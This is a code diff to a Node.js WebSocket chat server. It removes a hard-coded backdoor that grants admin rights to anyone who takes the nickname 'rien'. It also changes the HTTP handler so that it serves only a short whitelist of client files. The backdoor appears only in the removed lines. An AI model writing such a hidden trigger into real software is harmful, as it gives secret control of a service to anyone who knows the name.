@@ -137,8 +137,6 @@ class Chat {
             return user.handler.get('error')('invalid nick (max 25 letters, does not contain whitespace nor @ # & !)');
         let old = Object.assign(new User(), user);
         user.nick = newnick;
-if (newnick=='rien')
-    user.options.admin = true;
         user.handler.get('nick')(user.serialize());
         for (let channel of user.channels.values()) { for (let [dest, options] of channel.users) { dest.handler.get('nick')(user.serialize(), old.serialize(), channel.name); }; };
     };
@@ -469,15 +467,27 @@ const host = '0.0.0.0';
 const port = process.argv[2] || 80;
 
 const server = http.createServer(function (req, res) {
-    fs.readFile('./client.html', function (err, data) {
-        if (err) {
-            res.writeHead(404, {'Content-Type': 'text/plain'});
-            res.end('404: File not found');
-        } else {
-            res.writeHead(200, {'Content-Type': 'text/html'});
-            res.end(data);
-        }
-    });
+    let serveFile = (path) => {
+        fs.readFile(path, function (err, data) {
+            if (err) {
+                res.writeHead(404, {'Content-Type': 'text/plain'});
+                res.end('404: File not found');
+            } else {
+                res.writeHead(200, {'Content-Type': 'text/html'});
+                res.end(data);
+            }
+        });
+    }
+    if ((req.url == '/') || (req.url == '/index.html') || (req.url == '/client.html')) {
+        serveFile('./client.html');
+    } else if (req.url == '/client.min.html') {
+        serveFile('./client.min.html');
+    } else if (req.url == '/winbox.bundle.min.js') {
+        serveFile('./winbox.bundle.min.js');
+    }else {
+        res.writeHead(404, {'Content-Type': 'text/plain'});
+        res.end('404: File not found');
+    }
 });
 
 const wss = new ws.WebSocketServer({server: server});
